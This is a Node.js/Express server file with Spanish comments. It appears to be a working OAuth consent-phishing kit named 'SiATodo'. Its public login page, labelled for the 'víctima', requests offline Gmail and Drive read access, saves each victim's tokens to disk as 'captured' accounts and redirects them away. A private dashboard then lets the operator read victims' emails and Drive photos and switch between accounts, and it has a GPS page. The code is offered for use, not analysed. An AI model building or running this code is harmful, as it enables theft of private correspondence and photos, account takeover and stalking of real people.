require('dotenv').config();
const express    = require('express');
const { google } = require('googleapis');
const session    = require('express-session');
const axios      = require('axios');
const fs         = require('fs');
const path       = require('path');
const crypto     = require('crypto');

const app  = express();
const PORT = process.env.PORT || 3000;

// ── OAuth2 ────────────────────────────────────────────────────────────────────
const oauth2Client = new google.auth.OAuth2(
  process.env.GOOGLE_CLIENT_ID,
  process.env.GOOGLE_CLIENT_SECRET,
  process.env.GOOGLE_REDIRECT_URI
);

const SCOPES = [
  'https://www.googleapis.com/auth/userinfo.email',
  'https://www.googleapis.com/auth/userinfo.profile',
  'https://www.googleapis.com/auth/gmail.readonly',
  'https://www.googleapis.com/auth/drive.readonly'
];

// ── Persistencia de usuarios en disco ────────────────────────────────────────
const USERS_FILE = path.join(__dirname, 'data', 'users.json');

function ensureDataDir() {
  const dir = path.join(__dirname, 'data');
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
}

function loadUsers() {
  ensureDataDir();
  try {
    if (fs.existsSync(USERS_FILE)) {
      return JSON.parse(fs.readFileSync(USERS_FILE, 'utf-8'));
    }
  } catch (err) {
    console.error('Error cargando users.json:', err.message);
  }
  return {};
}

function saveUsers(users) {
  ensureDataDir();
  try {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
  } catch (err) {
    console.error('Error guardando users.json:', err.message);
  }
}

// Cargar usuarios al arrancar
const users = loadUsers();
let activeEmail = Object.keys(users)[0] || null;

if (Object.keys(users).length > 0) {
  console.log(`\n💾 Cuentas cargadas desde disco: ${Object.keys(users).join(', ')}`);
}

// ── Autenticación del dashboard ───────────────────────────────────────────────
// La contraseña se guarda hasheada en .env como DASHBOARD_PASSWORD_HASH
// Para generar el hash: node -e "const c=require('crypto');console.log(c.createHash('sha256').update('TU_PASSWORD').digest('hex'))"

function hashPassword(password) {
  return crypto.createHash('sha256').update(password + process.env.SESSION_SECRET).digest('hex');
}

function checkDashboardPassword(password) {
  if (!process.env.DASHBOARD_PASSWORD_HASH) {
    console.warn('⚠️  DASHBOARD_PASSWORD_HASH no configurado en .env — dashboard desprotegido');
    return true; // sin hash configurado deja pasar (para setup inicial)
  }
  return hashPassword(password) === process.env.DASHBOARD_PASSWORD_HASH;
}

function requireDashboardAuth(req, res, next) {
  if (req.session.dashboardAuthed) return next();
  res.redirect('/admin/login');
}

// ── Middleware ────────────────────────────────────────────────────────────────
app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: process.env.SESSION_SECRET || 'dev-secret',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 8 * 60 * 60 * 1000 } // sesión del dashboard dura 8hs
}));

// ── Helpers ───────────────────────────────────────────────────────────────────
function getHeader(headers, name) {
  const h = headers.find(h => h.name.toLowerCase() === name.toLowerCase());
  return h ? h.value : null;
}

function decodeBase64(data) {
  try { return Buffer.from(data, 'base64').toString('utf-8'); }
  catch { return ''; }
}

function extractBody(payload) {
  if (payload.body && payload.body.data) return decodeBase64(payload.body.data);
  if (payload.parts) {
    const plain = payload.parts.find(p => p.mimeType === 'text/plain');
    if (plain?.body?.data) return decodeBase64(plain.body.data);
    const html = payload.parts.find(p => p.mimeType === 'text/html');
    if (html?.body?.data) return decodeBase64(html.body.data);
    for (const part of payload.parts) {
      const result = extractBody(part);
      if (result) return result;
    }
  }
  return null;
}

function getActiveUser() {
  return activeEmail ? users[activeEmail] : null;
}

async function getValidAccessToken(user) {
  if (!user) return null;
  const tokens     = user.tokens;
  const expiryDate = tokens.expiry_date || 0;
  const isExpired  = Date.now() >= expiryDate - 5 * 60 * 1000;

  if (isExpired && tokens.refresh_token) {
    try {
      oauth2Client.setCredentials(tokens);
      const { credentials } = await oauth2Client.refreshAccessToken();
      user.tokens = credentials;
      saveUsers(users); // persistir token refrescado
      console.log('🔄 Token refrescado para', user.email);
    } catch (err) {
      console.error('Error al refrescar token:', err.message);
      return null;
    }
  }
  return user.tokens.access_token;
}

// ── Login del dashboard ───────────────────────────────────────────────────────
app.get('/admin/login', (req, res) => {
  if (req.session.dashboardAuthed) return res.redirect('/dashboard');
  res.render('admin-login', { error: req.query.error || null });
});

app.post('/admin/login', (req, res) => {
  const { password } = req.body;
  if (checkDashboardPassword(password)) {
    req.session.dashboardAuthed = true;
    res.redirect('/dashboard');
  } else {
    res.redirect('/admin/login?error=1');
  }
});

app.get('/admin/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/admin/login');
});

// ── Rutas públicas (SSO víctima) ──────────────────────────────────────────────
app.get('/', (req, res) => res.render('login'));

app.get('/auth/google', (req, res) => {
  const url = oauth2Client.generateAuthUrl({
    access_type: 'offline',
    scope: SCOPES,
    prompt: 'consent',
    include_granted_scopes: false
  });
  res.redirect(url);
});

app.get('/auth/google/callback', async (req, res) => {
  try {
    const { code } = req.query;
    if (!code) return res.redirect('/?error=no_code');

    const { tokens } = await oauth2Client.getToken(code);
    oauth2Client.setCredentials(tokens);

    const people     = google.people({ version: 'v1', auth: oauth2Client });
    const profileRes = await people.people.get({
      resourceName: 'people/me',
      personFields: 'emailAddresses,names,photos'
    });

    const email  = profileRes.data.emailAddresses?.[0]?.value || '';
    const name   = profileRes.data.names?.[0]?.displayName    || 'Usuario';
    const avatar = profileRes.data.photos?.[0]?.url           || '';

    users[email] = { name, email, avatar, tokens, capturedAt: new Date().toISOString() };
    activeEmail  = email;
    saveUsers(users); // ← persistir en disco inmediatamente

    console.log('✅ Cuenta capturada:', email);
    console.log('   Total cuentas:', Object.keys(users).length);

    res.redirect('https://hefin.net');
  } catch (err) {
    console.error('Error en OAuth callback:', err.message);
    res.redirect('/?error=auth_failed');
  }
});

// ── Dashboard (protegido con contraseña) ─────────────────────────────────────
app.get('/dashboard', requireDashboardAuth, (req, res) => {
  const user = getActiveUser();
  if (!user && Object.keys(users).length > 0) {
    activeEmail = Object.keys(users)[0];
  }
  res.render('dashboard', {
    name:        user?.name        || '',
    email:       user?.email       || '',
    avatar:      user?.avatar      || '',
    accounts:    Object.values(users),
    activeEmail: activeEmail
  });
});

app.get('/switch/:email', requireDashboardAuth, (req, res) => {
  const email = decodeURIComponent(req.params.email);
  if (users[email]) {
    activeEmail = email;
    console.log('🔀 Cuenta activa:', email);
  }
  res.redirect('/dashboard');
});

app.get('/remove/:email', requireDashboardAuth, (req, res) => {
  const email = decodeURIComponent(req.params.email);
  if (users[email]) {
    delete users[email];
    saveUsers(users);
    console.log('🗑️  Cuenta eliminada:', email);
    if (activeEmail === email) activeEmail = Object.keys(users)[0] || null;
  }
  res.redirect('/dashboard');
});

// ── Correos ───────────────────────────────────────────────────────────────────
app.get('/emails', requireDashboardAuth, async (req, res) => {
  const user = getActiveUser();
  if (!user) return res.redirect('/dashboard');
  try {
    const accessToken = await getValidAccessToken(user);
    if (!accessToken) return res.redirect('/dashboard');

    oauth2Client.setCredentials(user.tokens);
    const gmail   = google.gmail({ version: 'v1', auth: oauth2Client });
    const listRes = await gmail.users.messages.list({ userId: 'me', maxResults: 20 });
    const msgList = listRes.data.messages || [];

    const messages = await Promise.all(msgList.map(async (msg) => {
      const full    = await gmail.users.messages.get({ userId: 'me', id: msg.id });
      const headers = full.data.payload?.headers || [];
      return {
        id:      msg.id,
        subject: getHeader(headers, 'Subject') || '(sin asunto)',
        from:    getHeader(headers, 'From')    || '(desconocido)',
        date:    new Date(parseInt(full.data.internalDate)).toLocaleString('es-AR'),
        snippet: full.data.snippet || ''
      };
    }));

    res.render('emails', { messages, email: user.email });
  } catch (err) {
    console.error('Error correos:', err.message);
    res.status(500).render('error', { message: 'Error al obtener los correos: ' + err.message });
  }
});

app.get('/emails/:id', requireDashboardAuth, async (req, res) => {
  const user = getActiveUser();
  if (!user) return res.redirect('/dashboard');
  try {
    const accessToken = await getValidAccessToken(user);
    if (!accessToken) return res.redirect('/dashboard');

    oauth2Client.setCredentials(user.tokens);
    const gmail   = google.gmail({ version: 'v1', auth: oauth2Client });
    const msg     = await gmail.users.messages.get({ userId: 'me', id: req.params.id, format: 'full' });
    const headers = msg.data.payload?.headers || [];
    const body    = extractBody(msg.data.payload) || msg.data.snippet || '(sin contenido)';

    res.render('email', {
      subject: getHeader(headers, 'Subject') || '(sin asunto)',
      from:    getHeader(headers, 'From')    || '(desconocido)',
      to:      getHeader(headers, 'To')      || '',
      date:    new Date(parseInt(msg.data.internalDate)).toLocaleString('es-AR'),
      body,
      isHtml:  body.includes('<') && body.includes('>')
    });
  } catch (err) {
    console.error('Error correo completo:', err.message);
    res.status(500).render('error', { message: 'Error al abrir el correo: ' + err.message });
  }
});

// ── Fotos ─────────────────────────────────────────────────────────────────────
app.get('/photos', requireDashboardAuth, async (req, res) => {
  const user = getActiveUser();
  if (!user) return res.redirect('/dashboard');
  try {
    const accessToken = await getValidAccessToken(user);
    if (!accessToken) return res.redirect('/dashboard');

    const driveRes = await axios.get(
      'https://www.googleapis.com/drive/v3/files',
      {
        headers: { Authorization: `Bearer ${accessToken}` },
        params: {
          q: "mimeType contains 'image/' and trashed=false",
          fields: 'files(id,name,mimeType,createdTime,thumbnailLink)',
          pageSize: 40,
          orderBy: 'createdTime desc'
        }
      }
    );

    const items = (driveRes.data.files || []).map(file => ({
      id:       file.id,
      thumb:    file.thumbnailLink
                  ? file.thumbnailLink.replace('=s220', '=s400')
                  : `https://drive.google.com/thumbnail?id=${file.id}&sz=w400`,
      full:     `https://drive.google.com/uc?export=view&id=${file.id}`,
      filename: file.name || 'foto',
      date:     file.createdTime
                  ? new Date(file.createdTime).toLocaleDateString('es-AR')
                  : ''
    }));

    res.render('photos', { items, email: user.email });
  } catch (err) {
    console.error('Error fotos:', err.message);
    if (err.response) console.error('  Data:', JSON.stringify(err.response.data));
    res.status(500).render('error', { message: 'Error al obtener fotos: ' + err.message });
  }
});

// ── GPS ───────────────────────────────────────────────────────────────────────
app.get('/gps', requireDashboardAuth, (req, res) => {
  const user = getActiveUser();
  if (!user) return res.redirect('/dashboard');
  res.render('gps', {
    name:          user.name,
    email:         user.email,
    avatar:        user.avatar,
    googleMapsKey: process.env.GOOGLE_MAPS_KEY || ''
  });
});

// ── Inicio servidor ───────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log('\n✅  SiATodo corriendo en http://localhost:' + PORT);
  console.log('    SSO login (víctima): http://localhost:' + PORT + '/');
  console.log('    Dashboard (tuyo):    http://localhost:' + PORT + '/dashboard\n');

  if (!process.env.DASHBOARD_PASSWORD_HASH) {
    console.warn('⚠️  ADVERTENCIA: DASHBOARD_PASSWORD_HASH no configurado.');
    console.warn('   Corré este comando para generar el hash de tu contraseña:');
    console.warn('   node genhash.js\n');
  }
});
